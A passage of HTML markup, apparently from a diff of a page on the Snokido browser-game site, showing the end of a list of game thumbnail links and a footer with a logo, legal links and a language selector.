class="capsim"><a href="https://www.snokido.com/game/troll-face-quest-horror"><img src="https://w8.snokido.com/img/trollface-quest-horror.jpg" width="156" height="90" alt="Troll Face Quest: Horror" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/vectaria"><img src="https://w8.snokido.com/img/vectaria-io.jpg" width="156" height="90" alt="Vectaria" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/minibloxio"><img src="https://w8.snokido.com/img/miniblox-io.jpg" width="156" height="90" alt="Miniblox.io" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/troll-face-quest-horror-2"><img src="https://w8.snokido.com/img/trollface-quest-horror-2.jpg" width="156" height="90" alt="Troll Face Quest: Horror 2" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/tribals-io"><img src="https://w8.snokido.com/img/tribals-io.jpg?301222" width="156" height="90" alt="Tribals.io" /></a></li>    </ul>
+  </div>
+</div>
+</main>
+<footer id="footer">
+  <div id="copyright">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 138.16 102.68"><path d="M129.2 26.52c-6.34-1.5-18.85-2.05-22.24-1.9-.56 0-.87.2-.94.58-1.65 5-11.6 28.4-11.6 28.4s6.2-17.56 6.24-21.77c0-.6-7.5-7.16-8.1-7.2-8.85-.8-25.26 0-26.64.73-.74.34-1.62.7-1.62 2.74-.15 1.2 2.44 60.05 4.57 62.88.3.42 7.38 7.38 7.94 7.44 5 .57 17.4-15.3 17.82-27.17a152.93 152.93 0 0 1 9 22.29c.13.33 7.58 7.48 8.06 7.5 8.65.25 8.73-31.15 2.2-42.78 9.2-13.85 24.25-21.7 24.25-23.94.02-.25-8-7.58-8.94-7.8z"/><path d="M136 97.62c0 .7-.93 1.23-2.74 1.75-2.53.7-12.45 2-21.1 1.74-.48 0-.8-.16-.93-.5-1.32-4.88-6.46-17.76-9-22.3a187.88 187.88 0 0 0 .21 18.91c0 .45-.32 1.08-1.6 1.18-7.08.6-18 .94-23.08.37a1.82 1.82 0 0 1-1.3-.72c-.94-1.26-2-14.17-2.85-27.52h50.7c5.58 11.02 11.4 24.8 11.7 27.08z" fill="#b22222"/><path d="M121.48 65.33l3.13 5.9h-51l-1.75-36c0-2.06.88-2.4 1.6-2.74 1.4-.74 17.8-1.53 26.65-.73.6.05.93.3.93.87a235.27 235.27 0 0 0 .93 28.1 275 275 0 0 0 11.61-28.39c.06-.4.38-.58.93-.58 3.4-.16 15.9.38 22.25 1.9.93.22 1.4.47 1.4.72 0 2.2-7.5 17.13-16.68 30.97z" fill="#d32d2d"/><path d="M49 .34c-1.9-.5-15.8-.9-25.42 2.1C0 9 0 27.05 0 31.44 0 54.72 24.75 66.58 24.75 74.2c0 5.93-13.46 6-14.6 6s-1.7.28-1.7 1A42.59 42.59 0 0 0 10 92.72c.27 1 8.44 9.7 10 9.7 7.5 0 21.68-8.5 28.85-21.8a23.4 23.4 0 0 0 2.77-11.71c.3-7.87-5.14-15.23-6.45-17.08-2.08-3.28-4.1-6.63-4.1-8.56a7.26 7.26 0 0 1 2.18-5.33c2.9-2.7 7.7-2.16 10.47-1.9 1.05 0 1.6-.35 1.6-1 0-1.84 7.1-16 4.16-25.66C59.33 8.63 51.46 0 49 .34z"/><path d="M60.2 76.9a23.3 23.3 0 0 1-2.77 11.71c-7.16 13.3-26.47 14.06-34 14.06a15.88 15.88 0 0 1-3.41-.26 2.15 2.15 0 0 1-1.47-1.7A43.4 43.4 0 0 1 17 89.14c0-.7.57-1 1.72-1s14.76.14 14.63-7.3c.2-3.78-3-7.14-6.17-9.78l-.88-.72h33l.2.72a19.51 19.51 0 0 1 .69 5.85z" fill="#7eb406"/><path d="M63.9 43c0 .7-.53 1-1.6 1-2.76-.25-7.57-.78-10.47 1.9a7.29 7.29 0 0 0-2.17 5.33c0 1.93 2 5.28 4.08 8.56a36.46 36.46 0 0 1 5.73 11.25h-32.3c-1.45-1.22-2.9-2.28-4-3.16h0a.69.69 0 0 1-.13-.11c-.35-.32-1.1-1-1.22-1.07l-.27-.24c-12.08-10.8-12.9-21-12.9-27 0-4.38 0-22.48 23.6-29 9.62-3 23.5-2.6 25.44-2.1 1.23.22 1.92.68 2.1 1.38 2.83 9.68 4.1 31.4 4.1 33.26z" fill="#97be2f"/>
+    </svg>All Rights Reserved © 2013-2026 Snokido  </div>
+	<a href="https://www.snokido.com/contact" class="contact">Contact</a>
+  <a href="https://www.snokido.com/cgu" class="cgu">Terms of Use</a>
+  <a href="https://www.snokido.com/privacy" class="privacy">Privacy Policy</a>
+  <button type="button" aria-label="Language" class="flag">
+		<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 335.45">
+			<path d="M473.65 0H38.36A38.35 38.35 0 0 0 0 38.35V297.1a38.35 38.35 0 0 0 38.35 38.34h435.3A38.35 38.35 0 0 0 512 297.11V38.35A38.35 38.35 0 0 0 473.64 0z" fill="#41479b"/><path d="M511.47 32a38.35 38.35 0 0 0-37.81-32h-10L300.14 107.15V0h-88.28v107.15L48.32 0h-10A38.35 38.35 0 0 0 .53 32l139.78 91.58H0v88.27h140.3L.53 303.44a38.35 38.35 0 0 0 37.81 32h10L211.86 228.3v107.15h88.28V228.3l163.54 107.15h10a38.35 38.35 0 0 0 37.82-32l-139.8-91.6H512V123.6H371.7L511.47 32z" fill="#f5f5f5"/><path d="M282.48 0h-53v141.24H0v53h229.52v141.2h53V194.2H512v-53H282.48zM24.78 333l186.6-121.14h-32.43L9.22 322a38.52 38.52 0 0 0 15.57 11zm321.6-121.12H314l180.68 117.3A38.55 38.55 0 0 0 507 316.09L346.4 211.86zM4.05 21.2l157.73 102.4h32.43L15.48 7.57A38.41 38.41 0 0 0 4.05 21.2zm328.52 102.4l170-110.38A38.49 38.49 0 0 0 486.9 2.35L300.14 123.6z" fill="#ff4b55"/>
+		</svg>
+	</button>
+	<ul id="flag">
+		<li>
+			<a href="https://www.snokido.fr/jeu/baldis-basics" aria-label="Français">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 472 309.25">
+					<path d="M157.33 309.24H38.14C4 309.24 0 280.38 0 271.1v-233C0 30.58.8 0 38.14 0h119.2v309.24z" fill="#41479b"/><path d="M157.34,0H314.67V309.25H157.34Z" fill="#f5f5f5"/><path d="M314.67 309.24V0h119.2C470.1 0 472 30.7 472 38.14v233c0 8.18-1.1 38.14-38.14 38.14z" fill="#ff4b55"/>
+				</svg>
+				<span>Français</span>
+			</a>
+		</li>
+		<li>
+			<button type="button" aria-label="English">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 335.45">
+					<path d="M473.65 0H38.36A38.35 38.35 0 0 0 0 38.35V297.1a38.35 38.35 0 0 0 38.35 38.34h435.3A38.35 38.35 0 0 0 512 297.11V38.35A38.35 38.35 0 0 0 473.64 0z" fill="#41479b"/><path d="M511.47 32a38.35 38.35 0 0 0-37.81-32h-10L300.14 107.15V0h-88.28v107.15L48.32 0h-10A38.35 38.35 0 0 0 .53 32l139.78 91.58H0v88.27h140.3L.53 303.44a38.35 38.35 0 0 0 37.81 32h10L211.86 228.3v107.15h88.28V228.3l163.54 107.15h10a38.35 38.35 0 0 0 37.82-32l-139.8-91.6H512V123.6H371.7L511.47 32z" fill="#f5f5f5"/><path d="M282.48 0h-53v141.24H0v53h229.52v141.2h53V194.2H512v-53H282.48zM24.78 333l186.6-121.14h-32.43L9.22 322a38.52 38.52 0 0 0 15.57 11zm321.6-121.12H314l180.68 117.3A38.55 38.55 0 0 0 507 316.09L346.4 211.86zM4.05 21.2l157.73 102.4h32.43L15.48 7.57A38.41 38.41 0 0 0 4.05 21.2zm328.52 102.4l170-110.38A38.49 38.49 0 0 0 486.9 2.35L300.14 123.6z" fill="#ff4b55"/>
+				</svg>
+				<span>English</span>
+			</button>
+		</li>
+	</ul></footer>
 </body>
 </html>
